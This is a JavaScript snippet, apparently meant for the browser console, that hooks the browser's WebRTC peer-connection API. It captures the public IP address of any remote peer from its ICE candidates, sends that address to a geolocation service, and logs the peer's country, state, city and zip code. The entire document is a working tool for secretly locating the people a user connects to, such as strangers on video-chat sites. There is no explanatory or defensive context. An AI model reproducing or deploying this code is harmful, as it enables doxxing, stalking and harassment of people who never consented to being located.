window.oRTCPeerConnection = window.oRTCPeerConnection || window.RTCPeerConnection

window.RTCPeerConnection = function(...args) {
const pc = new window.oRTCPeerConnection(...args)

pc.oaddIceCandidate = pc.addIceCandidate

pc.addIceCandidate = function(iceCandidate, ...rest) {
const fields = iceCandidate.candidate.split(' ')

function httpGet(Url)
{
var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", Url, false );
xmlHttp.send( null );
return xmlHttp.responseText;
}

if (fields[7] === 'srflx') {
console.log('---------- NEW CAPTURE ----------')
console.log('IP Address:', fields[4])
url = "https://freegeoip.app/json/" + fields[4]
geographic_info = httpGet(url)
var data = JSON.parse(geographic_info)
console.log('Country: ' + data.country_name)
console.log('State: ' + data.region_name)
console.log('City: ' + data.city)
console.log('Zip Code: ' + data.zip_code)
console.log('---------------------------------')
}
return pc.oaddIceCandidate(iceCandidate, ...rest)

}

return pc
}
